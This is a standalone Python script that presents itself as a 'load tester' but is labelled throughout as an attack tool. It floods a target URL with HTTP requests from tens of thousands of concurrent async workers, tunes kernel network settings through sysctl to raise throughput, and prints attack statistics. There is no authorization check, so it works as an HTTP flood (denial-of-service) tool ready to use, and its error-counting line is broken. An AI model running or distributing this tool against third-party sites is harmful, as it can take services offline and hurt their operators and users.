#!/usr/bin/env python3
import asyncio
import aiohttp
import time
import uvloop
import os
import resource
import signal
from argparse import ArgumentParser

# System Optimization
def tune_system():
    try:
        # File descriptor limits
        resource.setrlimit(resource.RLIMIT_NOFILE, (1000000, 1000000))

        # Network stack tuning
        os.system("sysctl -w net.ipv4.tcp_tw_reuse=1")
        os.system("sysctl -w net.ipv4.ip_local_port_range='1024 65535'")
        os.system("sysctl -w net.core.somaxconn=65535")
        os.system("sysctl -w net.ipv4.tcp_max_syn_backlog=65535")
        os.system("sysctl -w net.core.netdev_max_backlog=300000")

        # CPU priority
        os.nice(-20)
        return True
    except:
        return False

# Async Worker
async def attack_worker(session, url, queue, stats):
    while True:
        await queue.get()
        start = time.monotonic()
        try:
            async with session.get(url) as resp:
                await resp.read()
                stats['success'] += 1
                stats['latency'] += time.monotonic() - start
        except Exception as e:
            stats['errors'] += 1
            stats['error_types'][str(type(e))] = stats
            ['error_types'].get(str(type(e)), 0) + 1
        finally:
            queue.task_done()

# Main Attack
async def run_attack(target, duration, workers):
    if not tune_system():
        print("⚠️ Couldn't optimize system (run as root)")
    
    stats = {
        'success': 0,
        'errors': 0,
        'latency': 0.0,
        'error_types': {},
        'start': time.monotonic()
    }
    
    conn = aiohttp.TCPConnector(
        limit=0,
        force_close=False,
        enable_cleanup_closed=True,
        keepalive_timeout=30,
        use_dns_cache=True
    )
    
    timeout = aiohttp.ClientTimeout(total=5, connect=2)
    headers = {
        'User-Agent': 'Mozilla/5.0',
        'Accept-Encoding': 'gzip, deflate',
        'Connection': 'keep-alive'
    }
    
    queue = asyncio.Queue(maxsize=workers*2)
    
    async with aiohttp.ClientSession(
        connector=conn,
        timeout=timeout,
        headers=headers
    ) as session:
        # Create workers
        tasks = [
            asyncio.create_task(attack_worker(session, target, queue, stats))
            for _ in range(workers)
        ]

        # Main loop
        try:
            while time.monotonic() - stats['start'] < duration:
                try:
                    queue.put_nowait(1)
                except asyncio.QueueFull:
                    await asyncio.sleep(0.001)

                # Live stats every 0.5s
                if int((time.monotonic() - stats['start'])*10) % 5 == 0:
                    elapsed = max(0.1, time.monotonic() - stats['start'])
                    print(
                        f"\rRequests: {stats['success'] + stats['errors']:,} | "
                        f"Success: {stats['success']:,} | "
                        f"RPS: {stats['success']/elapsed:,.0f} | "
                        f"Errors: {stats['errors']:,}",
                        end='', flush=True
                    )
        finally:
            # Clean shutdown
            await queue.join()
            for task in tasks:
                task.cancel()
            await asyncio.gather(*tasks, return_exceptions=True)
    
    # Final report
    total_time = time.monotonic() - stats['start']
    print("\n\n=== Attack Results ===")
    print(f"Target: {target}")
    print(f"Duration: {total_time:.2f}s")
    print(f"Total requests: {stats['success'] + stats['errors']:,}")
    print(f"Successful: {stats['success']:,} ({stats['success']/(stats['success']+stats['errors'])*100:.1f}%)")
    print(f"Failed: {stats['errors']:,}")
    print(f"Average RPS: {stats['success']/total_time:,.0f}")
    if stats['success'] > 0:
        print(f"Avg latency: {stats['latency']/stats['success']*1000:.1f}ms")
    
    if stats['error_types']:
        print("\nError Breakdown:")
        for err, count in stats['error_types'].items():
            print(f"- {err}: {count:,}")

# CLI Interface
def main():
    parser = ArgumentParser(description="🔥 Ultimate HTTP Load Tester")
    parser.add_argument("url", help="Target URL")
    parser.add_argument("-d", "--duration", type=int, default=60, help="Test duration (seconds)")
    parser.add_argument("-w", "--workers", type=int, default=50000, help="Concurrent workers")
    
    args = parser.parse_args()
    
    print(f"Starting attack on {args.url} for {args.duration}s with {args.workers:,} workers...")
    print("Press Ctrl+C to stop\n")
    
    try:
        uvloop.install()
        asyncio.run(run_attack(args.url, args.duration, args.workers))
    except KeyboardInterrupt:
        print("\nAttack stopped by user")

if __name__ == "__main__":
    main()
